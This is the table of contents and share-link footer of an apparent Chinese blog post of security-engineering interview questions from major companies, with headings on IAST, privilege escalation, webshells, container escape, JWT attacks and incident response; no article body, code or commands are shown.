href="#%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%8C%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B%EF%BC%9F"><span class="toc-number">9.8.</span> <span class="toc-text">进程隐藏技术是什么，如何检测？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%8A%E8%81%8A-IAST"><span class="toc-number">9.9.</span> <span class="toc-text">聊聊 IAST</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E5%A4%9A%E8%BF%9B%E7%A8%8B%E4%B8%8B%EF%BC%8CA-%E8%BF%9B%E7%A8%8B%E7%9A%84-Source-%E8%A7%A6%E5%8F%91%E5%88%B0%E4%BA%86-B-%E8%BF%9B%E7%A8%8B%E7%9A%84-Sink-%E7%82%B9%EF%BC%8C%E5%A6%82%E4%BD%95%E6%BA%AF%E6%BA%90%EF%BC%9F"><span class="toc-number">9.10.</span> <span class="toc-text">如果多进程下，A 进程的 Source 触发到了 B 进程的 Sink 点，如何溯源？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SCA%E6%98%AF%E4%BB%80%E4%B9%88%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0"><span class="toc-number">9.11.</span> <span class="toc-text">SCA是什么以及如何实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SCA%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F"><span class="toc-number">9.11.1.</span> <span class="toc-text">SCA的实现方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%8E%A2%E6%B5%8B%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%9F%90%E4%B8%AA%E7%B1%BB%EF%BC%88jar%E5%8C%85%EF%BC%89"><span class="toc-number">9.12.</span> <span class="toc-text">如何探测是否存在某个类（jar包）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%A4%9A%E7%AA%97%E5%8F%A3%E5%92%8C%E5%A4%9A%E6%A0%87%E7%AD%BE%E7%9A%84%E8%AE%BE%E8%AE%A1"><span class="toc-number">9.13.</span> <span class="toc-text">浏览器多窗口和多标签的设计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8Eagent%E5%88%B0%E5%AD%97%E8%8A%82%E7%A0%81hook%E7%9A%84%E6%95%B4%E4%B8%AA%E6%B5%81%E7%A8%8B%EF%BC%88%E4%BC%AA%E4%BB%A3%E7%A0%81%EF%BC%89"><span class="toc-number">9.14.</span> <span class="toc-text">从agent到字节码hook的整个流程（伪代码）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#log4j%E6%9C%89%E5%93%AA%E4%BA%9B%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95%E6%8A%80%E6%9C%AF%E5%B1%82%E9%9D%A2"><span class="toc-number">9.15.</span> <span class="toc-text">log4j有哪些防御方法技术层面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%88%E4%B8%80%E4%B8%8BCodeQL%EF%BC%8C%E8%83%BD%E4%B8%8D%E8%83%BD%E7%94%A8%E6%9D%A5%E5%81%9ACI-CD"><span class="toc-number">9.16.</span> <span class="toc-text">谈一下CodeQL，能不能用来做CI&#x2F;CD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CodeQL%E5%93%AA%E4%BA%9B%E5%9C%B0%E6%96%B9%E4%BC%9A%E6%96%AD%EF%BC%8C%E8%AF%A5%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86"><span class="toc-number">9.17.</span> <span class="toc-text">CodeQL哪些地方会断，该怎么处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B4%E4%B8%80%E4%B8%8BSAST%E3%80%81DAST%E3%80%81IAST%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9"><span class="toc-number">9.18.</span> <span class="toc-text">说一下SAST、DAST、IAST的优缺点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D%E4%B8%8BDevSecOps"><span class="toc-number">9.19.</span> <span class="toc-text">介绍下DevSecOps</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IAST-%E4%B8%BB%E5%8A%A8%E5%92%8C%E8%A2%AB%E5%8A%A8%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">9.20.</span> <span class="toc-text">IAST 主动和被动的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IAST%E5%9C%A8CI-CD%E4%B8%AD%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="toc-number">9.21.</span> <span class="toc-text">IAST在CI&#x2F;CD中的位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AST%E7%9A%84%E5%AE%9A%E4%B9%89"><span class="toc-number">9.22.</span> <span class="toc-text">AST的定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90AST%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">9.23.</span> <span class="toc-text">代码生成AST的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E7%BB%8F%E8%BF%87IR%E9%98%B6%E6%AE%B5%E7%94%9F%E6%88%90AST%E7%9A%84%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B6%E7%BC%BA%E9%99%B7"><span class="toc-number">9.24.</span> <span class="toc-text">不经过IR阶段生成AST的方法及其缺陷</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HIDS%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-number">9.25.</span> <span class="toc-text">HIDS的流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">9.26.</span> <span class="toc-text">提权的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-number">9.27.</span> <span class="toc-text">suid提权的生命周期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E7%83%82%E5%9C%9F%E8%B1%86"><span class="toc-number">9.28.</span> <span class="toc-text">Windows 烂土豆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IAST%E5%92%8CRASP%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">9.29.</span> <span class="toc-text">IAST和RASP的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IAST%E5%92%8CRASP%E5%9C%A8%E5%9F%8B%E7%82%B9%E6%B7%B1%E6%B5%85%E4%B8%8A%E7%9A%84%E5%A4%84%E7%90%86"><span class="toc-number">9.30.</span> <span class="toc-text">IAST和RASP在埋点深浅上的处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%8B%E7%82%B9%E6%B7%B1%E6%B5%85%E5%AF%B9%E6%A3%80%E5%87%BA%E7%8E%87%E7%9A%84%E5%BD%B1%E5%93%8D"><span class="toc-number">9.31.</span> <span class="toc-text">埋点深浅对检出率的影响</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#log4j%E5%81%9A%E5%9F%8B%E7%82%B9%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F%E5%8F%8A%E5%85%B6%E5%8C%BA%E5%88%AB"><span class="toc-number">9.32.</span> <span class="toc-text">log4j做埋点的两种方式及其区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BE%E5%BA%A6%E7%9A%84IAST%E5%AE%9E%E7%8E%B0%E5%8F%8A%E4%B8%BB%E5%8A%A8%E5%BC%8F%E5%92%8C%E8%A2%AB%E5%8A%A8%E5%BC%8F%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">9.33.</span> <span class="toc-text">百度的IAST实现及主动式和被动式的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IAST%E5%92%8CRASP%E6%98%AF%E5%90%A6%E4%BC%9A%E4%BA%A7%E7%94%9F%E8%84%8F%E6%95%B0%E6%8D%AE"><span class="toc-number">9.34.</span> <span class="toc-text">IAST和RASP是否会产生脏数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%8F%8A%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3"><span class="toc-number">9.35.</span> <span class="toc-text">符号执行及约束求解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E7%94%A8Fuzz%E6%A3%80%E6%B5%8B%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B"><span class="toc-number">9.36.</span> <span class="toc-text">可用Fuzz检测的漏洞类型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%BA%E7%A8%8B"><span class="toc-number">10.</span> <span class="toc-text">携程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SQL-%E6%B3%A8%E5%85%A5%E5%86%99%E9%A9%AC"><span class="toc-number">10.1.</span> <span class="toc-text">1. SQL 注入写马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#outfile-%E5%92%8C-dumpfile-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">10.1.1.</span> <span class="toc-text">outfile 和 dumpfile 的区别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A%E5%88%A9%E7%94%A8-outfile-%E5%86%99-Webshell"><span class="toc-number">10.1.2.</span> <span class="toc-text">示例：利用 outfile 写 Webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A%E5%88%A9%E7%94%A8-dumpfile-%E5%86%99%E5%8D%95%E8%A1%8C"><span class="toc-number">10.1.3.</span> <span class="toc-text">示例：利用 dumpfile 写单行</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AE%BD%E5%AD%97%E7%AC%A6%E6%88%AA%E6%96%AD%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">10.2.</span> <span class="toc-text">2. 宽字符截断的原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">10.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-5"><span class="toc-number">10.2.2.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-SSRF-%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">10.3.</span> <span class="toc-text">3. SSRF 无回显的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-number">10.3.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">10.3.2.</span> <span class="toc-text">工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-6"><span class="toc-number">10.3.3.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Shiro-%E6%BC%8F%E6%B4%9E"><span class="toc-number">10.4.</span> <span class="toc-text">4. Shiro 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-4"><span class="toc-number">10.4.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-3"><span class="toc-number">10.4.2.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%B1%E8%B4%A5%E5%8E%9F%E5%9B%A0"><span class="toc-number">10.4.3.</span> <span class="toc-text">失败原因</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%8F%8D%E5%BC%B9-Shell-%E7%9A%84%E6%9C%AC%E8%B4%A8"><span class="toc-number">10.5.</span> <span class="toc-text">5. 反弹 Shell 的本质</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-7"><span class="toc-number">10.5.1.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E4%BD%9C%E4%B8%BA-Agent-%E9%87%87%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="toc-number">10.6.</span> <span class="toc-text">6. 作为 Agent 采集信息</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9C%80%E8%A6%81%E9%87%87%E9%9B%86%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">10.6.1.</span> <span class="toc-text">需要采集的信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E5%BB%BA%E8%BF%9B%E7%A8%8B%E6%A0%91"><span class="toc-number">10.6.2.</span> <span class="toc-text">构建进程树</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%8F%90%E6%9D%83%E6%A3%80%E6%B5%8B"><span class="toc-number">10.7.</span> <span class="toc-text">7. 提权检测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux-%E6%8F%90%E6%9D%83%E6%A3%80%E6%B5%8B"><span class="toc-number">10.7.1.</span> <span class="toc-text">Linux 提权检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows-%E6%8F%90%E6%9D%83%E6%A3%80%E6%B5%8B"><span class="toc-number">10.7.2.</span> <span class="toc-text">Windows 提权检测</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E4%BA%91%E5%8E%9F%E7%94%9F%E4%B8%8E%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8"><span class="toc-number">10.8.</span> <span class="toc-text">8. 云原生与容器安全</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Docker-%E9%80%83%E9%80%B8"><span class="toc-number">10.8.1.</span> <span class="toc-text">Docker 逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Kubernetes-%E9%80%83%E9%80%B8"><span class="toc-number">10.8.2.</span> <span class="toc-text">Kubernetes 逃逸</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E4%BA%91%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2"><span class="toc-number">10.9.</span> <span class="toc-text">9. 云服务攻防</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">10.9.1.</span> <span class="toc-text">常见漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-8"><span class="toc-number">10.9.2.</span> <span class="toc-text">示例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vivo"><span class="toc-number">11.</span> <span class="toc-text">vivo</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9C%A8%E5%8F%AA%E6%9C%89%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%80%E4%B8%AA%E7%82%B9%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E6%9C%89%E4%BB%80%E4%B9%88%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9F"><span class="toc-number">11.1.</span> <span class="toc-text">1. 在只有任意文件读取一个点的情况下有什么利用方式？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%80%8E%E4%B9%88%E6%89%BE%E5%BC%80%E4%BA%86%E4%BB%80%E4%B9%88%E6%9C%8D%E5%8A%A1%EF%BC%88-proc-pid-cmdline%EF%BC%89%EF%BC%9F"><span class="toc-number">11.2.</span> <span class="toc-text">2. 怎么找开了什么服务（&#x2F;proc&#x2F;pid&#x2F;cmdline）？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%80%8E%E4%B9%88%E6%89%BE%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%EF%BC%9F"><span class="toc-number">11.3.</span> <span class="toc-text">3. 怎么找绝对路径？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Linux%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8%E6%96%87%E4%BB%B6"><span class="toc-number">11.4.</span> <span class="toc-text">5. Linux开机自启动文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%81%8A%E4%BA%91AK-SK%E7%9B%B8%E5%85%B3%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E9%98%B2%E5%BE%A1"><span class="toc-number">11.5.</span> <span class="toc-text">6. 聊云AK&#x2F;SK相关的利用和防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%81%8ASSO%E7%9B%B8%E5%85%B3%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">11.6.</span> <span class="toc-text">7. 聊SSO相关的攻击方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87%E5%8A%A8%E6%80%81Token%EF%BC%9F"><span class="toc-number">11.7.</span> <span class="toc-text">8. 怎么绕过动态Token？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87%E5%8F%8C%E5%9B%A0%E5%AD%90%E8%AE%A4%E8%AF%81%EF%BC%9F"><span class="toc-number">11.8.</span> <span class="toc-text">9. 怎么绕过双因子认证？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F%E6%9C%89%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-number">11.9.</span> <span class="toc-text">10. 内网扫描有流量检测怎么办？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E6%9D%A1%E4%BB%B6"><span class="toc-number">11.10.</span> <span class="toc-text">11. Redis主从复制条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-JWT%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">11.11.</span> <span class="toc-text">12. JWT攻击方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%AC%E4%B8%9C"><span class="toc-number">12.</span> <span class="toc-text">京东</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88IIS%E3%80%81Apache%E3%80%81Nginx%EF%BC%89"><span class="toc-number">12.1.</span> <span class="toc-text">文件解析漏洞（IIS、Apache、Nginx）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE%E7%9B%B4%E6%8E%A5RCE"><span class="toc-number">12.2.</span> <span class="toc-text">XXE直接RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%9C%9C%E7%BD%90%E6%BA%AF%E6%BA%90%EF%BC%88JSONP%EF%BC%89"><span class="toc-number">12.3.</span> <span class="toc-text">蜜罐溯源（JSONP）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99-Poc-%E7%94%A8-Python-%E5%8F%8A%E5%85%B6%E5%BA%93"><span class="toc-number">12.4.</span> <span class="toc-text">写 Poc 用 Python 及其库</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%BF%E9%87%8C"><span class="toc-number">13.</span> <span class="toc-text">阿里</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BF%AE%E5%A4%8D"><span class="toc-number">13.1.</span> <span class="toc-text">Java原生反序列化修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8C%BA%E5%88%AB"><span class="toc-number">13.2.</span> <span class="toc-text">Java反序列化区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-Fastjson%E4%BF%AE%E5%A4%8D"><span class="toc-number">13.3.</span> <span class="toc-text">Java Fastjson修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E8%BF%91%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%8F%8A%E7%9C%8B%E6%B3%95"><span class="toc-number">13.4.</span> <span class="toc-text">最近安全事件及看法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E8%A6%81%E7%82%B9"><span class="toc-number">13.5.</span> <span class="toc-text">指纹识别要点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E7%BB%98%E5%BC%95%E6%93%8E%E5%85%B3%E9%94%AE%E5%9B%A0%E7%B4%A0"><span class="toc-number">13.6.</span> <span class="toc-text">测绘引擎关键因素</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%99%BB%E5%BD%95%E6%97%A5%E5%BF%97"><span class="toc-number">13.7.</span> <span class="toc-text">查看登录日志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E8%87%AA%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">13.8.</span> <span class="toc-text">Windows自启动方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%87%BA%E6%9C%A8%E9%A9%AC%E8%BF%9B%E7%A8%8B"><span class="toc-number">13.9.</span> <span class="toc-text">找出木马进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E5%BA%94%E6%80%A5%E5%A4%84%E7%BD%AE"><span class="toc-number">13.10.</span> <span class="toc-text">挖矿木马应急处置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%99%BB%E5%BD%95%E6%97%A5%E5%BF%97-1"><span class="toc-number">13.11.</span> <span class="toc-text">查看登录日志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E8%87%AA%E5%90%AF%E5%8A%A8%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">13.12.</span> <span class="toc-text">Windows自启动的方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%87%BA%E5%9B%9E%E8%BF%9EC2%E5%9C%B0%E5%9D%80%E7%9A%84%E8%BF%9B%E7%A8%8B"><span class="toc-number">13.13.</span> <span class="toc-text">找出回连C2地址的进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%A4%84%E7%BD%AE%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC"><span class="toc-number">13.14.</span> <span class="toc-text">应急处置挖矿木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%92%E6%9F%A5C2%E5%9F%9F%E5%90%8D"><span class="toc-number">13.15.</span> <span class="toc-text">排查C2域名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E4%BF%AE%E5%A4%8D%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">13.16.</span> <span class="toc-text">XSS修复与利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#log4j%E9%99%A4%E4%BA%86%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC%E5%A4%96%E8%BF%98%E6%9C%89%E4%BB%80%E4%B9%88%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F"><span class="toc-number">13.17.</span> <span class="toc-text">log4j除了升级版本外还有什么修复方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0%E4%B8%80%E4%B8%AAwebshell%E6%80%8E%E4%B9%88%E5%88%A4%E6%96%AD%E4%BB%96%E6%98%AF%E5%9C%A8docker%E9%87%8C%E8%BF%98%E6%98%AF%E5%AE%9E%E6%9C%BA%E9%87%8C"><span class="toc-number">13.18.</span> <span class="toc-text">拿到一个webshell怎么判断他是在docker里还是实机里</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-API%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-number">13.19.</span> <span class="toc-text">Docker API未授权漏洞介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%BA%E5%99%A8%E9%87%8D%E5%90%AF%E5%90%8E%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%98%E5%9C%A8%E5%90%97"><span class="toc-number">13.20.</span> <span class="toc-text">机器重启后内存马还在吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E7%B1%BB"><span class="toc-number">13.21.</span> <span class="toc-text">Tomcat内存马分类</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%A6%E5%B0%8F%E6%BB%A1"><span class="toc-number">14.</span> <span class="toc-text">度小满</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E7%9A%84%E6%BA%90%E7%A0%81%E5%A4%84%E7%90%86"><span class="toc-number">14.1.</span> <span class="toc-text">加密的源码处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">14.2.</span> <span class="toc-text">PHP的危险函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88LFI%EF%BC%89"><span class="toc-number">14.3.</span> <span class="toc-text">本地文件包含（LFI）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E9%99%A4%E4%BA%86SLEEP%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">14.4.</span> <span class="toc-text">MySQL除了SLEEP的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E8%AF%BB%E6%96%87%E4%BB%B6%E7%9A%84%E6%BA%AF%E6%BA%90%EF%BC%88MySQL%E8%9C%9C%E7%BD%90%EF%BC%89"><span class="toc-number">14.5.</span> <span class="toc-text">MySQL读文件的溯源（MySQL蜜罐）</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godreams.cn/2024/03/17/work/workpre5/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godreams.cn/2024/03/17/work/workpre5/&text=【工作】面试题整理 大厂常见问题2"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godreams.cn/2024/03/17/work/workpre5/&title=【工作】面试题整理 大厂常见问题2"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godreams.cn/2024/03/17/work/workpre5/&is_video=false&description=【工作】面试题整理 大厂常见问题2"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【工作】面试题整理 大厂常见问题2&body=Check out this article: https://godreams.cn/2024/03/17/work/workpre5/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godreams.cn/2024/03/17/work/workpre5/&title=【工作】面试题整理 大厂常见问题2"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godreams.cn/2024/03/17/work/workpre5/&title=【工作】面试题整理 大厂常见问题2"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
